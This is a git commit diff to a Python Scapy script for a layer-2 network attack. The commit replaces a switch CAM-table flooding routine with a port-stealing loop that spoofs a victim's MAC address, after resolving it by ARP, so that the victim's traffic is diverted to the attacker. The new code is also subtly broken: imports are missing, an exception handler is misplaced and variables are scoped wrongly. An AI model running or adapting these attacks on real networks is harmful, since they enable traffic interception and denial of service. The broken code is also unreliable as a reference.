a0e2edc7cc774b5026738f015bfbf3b697156750
P4ti3nn3 <115619908+P4ti3nn3@users.noreply.github.com>
2023-12-05 09:39:12 +0100

    Update p0rtSte4l1ng.py

--- Scr1pts/p0rtSte4l1ng.py
+++ Scr1pts/p0rtSte4l1ng.py
@@ -3,19 +3,33 @@ from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp
 
 mac_attack = "XX:XX:XX:XX:XX:XX"
 mac_victim = "XX:XX:XX:XX:XX:XX"
+ip_victim = "X.X.X.X"
 
-def generate_packets():
-    packet_list = []
-    for i in range(1,10000):
-        packet  = Ether(src = mac_victim, dst= mac_attack)/IP(src=RandIP(),dst=RandIP())
-        packet_list.append(packet)
-    return packet_list
+def get_mac_from_ip(ip):
+    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
+    mac = srp(arp_packet, timeout=2, verbose=False, iface='eth1')[0][0][1].hwsrc
+    return mac
 
-def cam_overflow(packet_list):
-    sendp(packet_list, iface='eth1')
+def stealing(ip_victim, mac_victim):
+    packet  = Ether(src = mac_victim)/IP(dst=ip_victim)
+    sendp(packet, iface='eth1')
 
+def main():
+    if mac_victim == "XX:XX:XX:XX:XX:XX":
+        target_ip = input("target IP :")
+        try:
+            mac_victim = get_mac_from_ip(target_ip)
+            print("target MAC", mac_victim)
+        except:
+            print("No MAC found for target")
+            quit()
+    try:
+        while True:        
+            print("Sending packet from : ", mac_attack, " to : ", mac_victim)
+            stealing(target_ip,mac_victim)
+            time.sleep(1)
+        except KeyboardInterrupt:
+            quit()
+            
 if __name__ == '__main__':
-    print(mac_attack)
-    print(mac_victim)
-    packet_list = generate_packets()
-    cam_overflow(packet_list)
+    main()
